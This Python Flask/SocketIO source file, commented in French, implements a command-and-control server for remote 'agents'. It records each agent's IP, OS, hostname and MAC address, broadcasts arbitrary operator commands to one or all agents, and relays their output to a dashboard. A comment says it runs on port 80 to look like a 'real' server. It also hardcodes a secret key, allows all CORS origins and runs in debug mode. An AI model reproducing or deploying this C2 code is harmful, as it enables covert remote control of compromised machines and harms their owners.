from flask import Flask, render_template, request, jsonify
from flask_socketio import SocketIO, emit, join_room
import datetime
import os

app = Flask(__name__)
app.config['SECRET_KEY'] = 'elyptia_tactical_v2'
socketio = SocketIO(app, cors_allowed_origins="*")

# Stockage des agents en temps réel
agents = {}

@app.route('/')
def index():
    return render_template('index.html')

# API pour récupérer la liste des agents (utilisé par le dashboard)
@app.route('/api/agents')
def get_agents():
    return jsonify(agents)

# Gestion des évènements SocketIO
@socketio.on('connect')
def on_connect():
    print(f"[C2] Operator connected: {request.sid}")

@socketio.on('agent_join')
def on_agent_join(data):
    agent_id = data.get('id')
    agents[agent_id] = {
        'id': agent_id,
        'sid': request.sid,
        'ip': data.get('ip'),
        'os': data.get('os'),
        'hostname': data.get('hostname'),
        'mac': data.get('mac'),
        'last_seen': datetime.datetime.now().strftime("%H:%M:%S"),
        'status': 'Online'
    }
    join_room(agent_id) # Permet d'envoyer des commandes à cet agent précis
    print(f"[C2] New Agent registered: {agent_id} ({data.get('ip')})")
    emit('update_dashboard', agents, broadcast=True)

@socketio.on('disconnect')
def on_disconnect():
    for aid, info in list(agents.items()):
        if info['sid'] == request.sid:
            print(f"[C2] Agent disconnected: {aid}")
            info['status'] = 'Offline'
            emit('update_dashboard', agents, broadcast=True)

@socketio.on('dispatch_command')
def on_dispatch(data):
    target = data.get('target') # ID de l'agent ou 'all'
    cmd = data.get('command')
    timestamp = datetime.datetime.now().strftime("%H:%M:%S")
    
    print(f"[C2] Dispatching to {target}: {cmd}")
    
    if target == 'all':
        emit('execute_command', {'cmd': cmd, 'time': timestamp}, broadcast=True)
    else:
        emit('execute_command', {'cmd': cmd, 'time': timestamp}, room=target)

@socketio.on('agent_response')
def on_response(data):
    # Relai de la réponse de l'agent vers le dashboard
    emit('display_response', data, broadcast=True)

if __name__ == '__main__':
    if not os.path.exists('templates'): os.makedirs('templates')
    socketio.run(app, debug=True, port=80, host='0.0.0.0') # Port 80 pour faire "vrai" serveur
